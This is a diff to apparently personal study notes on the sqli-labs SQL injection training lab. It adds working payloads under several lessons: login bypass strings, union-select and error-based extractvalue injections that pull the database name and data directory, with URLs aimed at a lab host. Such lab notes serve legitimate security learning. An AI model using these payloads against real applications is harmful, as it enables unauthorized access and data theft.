@@ -88,10 +88,15 @@ Page-1(Basic Challenges)
 		$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
 		
 	Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)
+		uname=admin' or 1=1#  #&passwd=111&submit=Submit
+		uname=1admin'union select 1,database()#&passwd=111&submit=Submit
+		
 		@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
 		
 	Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)
-		@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
+		uname=admin") or 1=1#  #&passwd=111&submit=Submit
+	
+		@$sql="SELECT username, password FROM users WHERE username=("$uname") and password=("$passwd") LIMIT 0,1";
 		
 	Less-13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)
 		@$sql="SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1";
@@ -129,6 +134,8 @@ Page-2 (Advanced Injections)
 		$sql="SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1";
 		
 	Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)
+		http://1.117.162.201/sqli/Less-23/?id=-1'union select 1,@@datadir,'3
+		
 		$id = preg_replace("/#/","", $id);
 		$id = preg_replace("/--/","", $id);
 
@@ -137,6 +144,8 @@ Page-2 (Advanced Injections)
 		$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
 		
 	Less-25 Trick with OR & AND (过滤了or和and)
+		http://1.117.162.201/sqli/Less-25/?id=1'|| extractvalue(1,concat(0x7e,database()))--+
+		
 		$id= preg_replace('/or/i',"", $id);			
 		$id= preg_replace('/AND/i',"", $id);	
 		
